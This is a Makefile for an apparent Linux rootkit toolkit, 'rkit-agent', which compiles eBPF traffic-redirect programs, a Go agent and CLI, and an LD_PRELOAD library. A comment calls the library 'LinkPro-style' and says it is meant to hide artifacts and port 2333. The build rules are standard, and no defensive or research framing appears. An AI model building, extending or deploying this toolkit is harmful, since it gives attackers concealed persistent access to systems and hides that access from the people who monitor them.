OUTPUT := .output
CLANG  := clang
GO     := $(shell if [ -x /snap/bin/go ] && /snap/bin/go version 2>/dev/null | grep -qE 'go1\.(2[1-9]|[3-9][0-9])'; then echo /snap/bin/go; else echo go; fi)
BPFTOOL := $(shell command -v bpftool 2>/dev/null || command -v /usr/sbin/bpftool 2>/dev/null || echo bpftool)
ARCH   := x86
APP    := $(OUTPUT)/rkit-agent
CLI    := $(OUTPUT)/cli
PRELOAD_SO := $(OUTPUT)/getdents_preload.so

BPF_SRCS   := $(wildcard bpf/*.c)
BPF_OBJS   := $(patsubst bpf/%.c, $(OUTPUT)/%.bpf.o, $(BPF_SRCS))
AGENT_BPF  := cmd/rkit-agent/bpf
# Detect kernel arch for pt_regs layout (vmlinux.h); -target bpf does not set __aarch64__
UNAME_M    := $(shell uname -m)
BPF_ARCH   := $(if $(filter aarch64 arm64,$(UNAME_M)),arm64,x86)
BPF_CFLAGS := -g -O2 -target bpf -D__TARGET_ARCH_$(ARCH) -D__BPF_KERNEL_ARCH_$(BPF_ARCH) \
	-I$(OUTPUT) -Ibpf -I/usr/include/bpf \
	-I/usr/include/$(UNAME_M)-linux-gnu

CFLAGS := -g -O2 -Wall -I$(OUTPUT)
LDFLAGS := -lbpf -lelf -lz -lssl -lcrypto

.SECONDARY:
.PHONY: all clean check-deps deps preload

all: check-deps $(APP) $(CLI) $(PRELOAD_SO)
	@echo "[+] Build complete: $(APP), $(CLI), $(PRELOAD_SO)"

$(CLI): cmd/rkit-cli/main.go | $(OUTPUT)
	@echo "  GO      $@"
	@$(GO) build -o $@ ./cmd/rkit-cli

# LD_PRELOAD module (LinkPro-style): hide artifacts and port 2333
$(PRELOAD_SO): preload/getdents_preload.c | $(OUTPUT)
	@echo "  CC      $@"
	@$(CLANG) $(CFLAGS) -shared -fPIC $< -o $@ -ldl

# rkit-agent: build BPF + preload, copy into cmd/rkit-agent, then build Go binary
REDIRECT_BPF := $(OUTPUT)/ip_check.bpf.o $(OUTPUT)/ingress_redirect.bpf.o $(OUTPUT)/egress_restore.bpf.o
AGENT_PRELOAD := cmd/rkit-agent/preload
$(APP): $(REDIRECT_BPF) $(PRELOAD_SO) | $(OUTPUT)
	@mkdir -p $(AGENT_BPF) $(AGENT_PRELOAD)
	@cp $(OUTPUT)/ip_check.bpf.o $(AGENT_BPF)/
	@cp $(OUTPUT)/ingress_redirect.bpf.o $(AGENT_BPF)/
	@cp $(OUTPUT)/egress_restore.bpf.o $(AGENT_BPF)/
	@cp $(PRELOAD_SO) $(AGENT_PRELOAD)/getdents_preload.so
	@echo "  GO      $@"
	@GOOS=linux GOARCH=$$($(GO) env GOARCH 2>/dev/null || echo amd64) $(GO) build -o $@ ./cmd/rkit-agent

$(OUTPUT)/vmlinux.h: | $(OUTPUT)
	@echo "  GEN     vmlinux.h"
	@$(BPFTOOL) btf dump file /sys/kernel/btf/vmlinux format c > $@

$(OUTPUT)/%.bpf.o: bpf/%.c | $(OUTPUT) $(OUTPUT)/vmlinux.h
	@echo "  CLANG   $@"
	@$(CLANG) $(BPF_CFLAGS) -c $< -o $@

$(OUTPUT):
	mkdir -p $(OUTPUT)

preload: $(PRELOAD_SO)

check-deps:
	@$(GO) version >/dev/null 2>&1 || { echo "*** go not found. Install Go 1.21+"; exit 1; }
	@if [ ! -f /sys/kernel/btf/vmlinux ]; then \
		echo "*** Not Linux or no BTF. Build in VM or skip BPF."; \
		fi
	@echo "  DEPS    ok"

deps:
	@echo "Installing build dependencies (Ubuntu/Debian)..."
	sudo apt update
	sudo apt install -y clang llvm libbpf-dev libelf-dev zlib1g-dev libssl-dev
	sudo apt install -y linux-tools-$$(uname -r) || sudo apt install -y linux-tools-generic

clean:
	rm -rf $(OUTPUT)
	rm -f $(AGENT_BPF)/*.bpf.o
	rm -f $(AGENT_PRELOAD)/*.so